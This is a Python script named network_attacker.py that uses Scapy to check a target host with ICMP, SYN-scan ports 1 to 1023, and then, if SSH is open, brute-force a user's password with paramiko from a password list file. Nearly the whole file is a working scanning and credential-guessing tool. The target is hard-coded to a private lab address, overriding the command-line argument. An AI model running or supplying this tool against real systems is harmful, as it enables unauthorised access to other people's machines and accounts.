#! /usr/local/bin/python3.10

# Skip WARNING massages
from cryptography.utils import CryptographyDeprecationWarning
import warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

# Import required libraries - Scapy & paramiko
from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import paramiko
from colorama import init, Fore
import sys


# initialize colorama
init()

RESET = Fore.RESET
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED


# Ensure correct program usage
if len(sys.argv) != 2:
    print("USAGE: python3 network_attacker.py TARGET(IP_ADDR)")
    # sys.exit("USAGE: python3 network_attacker.py TARGET(IP_ADDR)")
    print('default: 192.168.0.102')
else:
    target = sys.argv[1]

# Assign variables
target = '192.168.0.102'
registered_ports = range(1, 1024, 1)
open_ports = []


# Main function
def main():

    # Check if target is reachable
    if available():

        # Loop over ports
        for p in registered_ports:
            status = scan_port(p)
            if status:
                open_ports.append(p)
                print(f"{GREEN}port: {p} at: {target} is opened{RESET}")
        print(f"{BLUE}--- finished scanning ---{RESET}")

        # Check if port '22' is opened
        if 22 in open_ports:
            answer = input("Do you want to perform brute-force attack ? y/n: ")
            if answer == 'y' or answer == 'Y':

                # Ask for username
                user = input("Type username: ")

                # Brute-Force SSH
                brute_force(22, user)


# ScanPort function
def scan_port(port):

    # Random source_port function
    source_port = RandShort()

    # Create synchronization packet
    syn_pkt = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)

    # Check if syn_pkt data exists
    if syn_pkt is None:
        return False

    # Check if syn_pkt has TCP layer
    elif syn_pkt.haslayer(TCP):

        # Get TCP layer - Check for flag 0x12
        if syn_pkt.getlayer(TCP).flags == 0x12:

            # Create reset packet
            send_rst = sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=3)
        else:
            return False

    return True


# Check for host
def available():

    # # Check ICMP packet & set verbosity to 0 for quiet response
    try:
        conf.verb = 0
        icmp_check = sr1(IP(dst=target) / ICMP(), timeout=3)
        if icmp_check is None:
            return False
    except Exception as err:
        print(err)
        return False

    return True


# Brute force function - using paramiko
def brute_force(port, username):

    reply = ''
    # Opening PasswordList.txt file
    with open("PasswordList.txt", "r") as password_lst:
        passwords = [line.rstrip() for line in password_lst]

    # Create ssh_conn variable
    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Loop over available passwords in list
    for password in passwords:
        try:
            ssh_conn.connect(target, port=port, username=username, password=password, timeout=1)
            print(f"Connected user: {GREEN}{username}{RESET} with password: {GREEN}{password}{RESET} successfully !")
            ssh_conn.close()
            reply = 'connected'
            break
        except Exception as er:
            print(f"password: {RED}{password}{RESET} failed")
            reply = er
        ssh_conn.close()
    return reply


# Calling main function
if __name__ == '__main__':
    main()
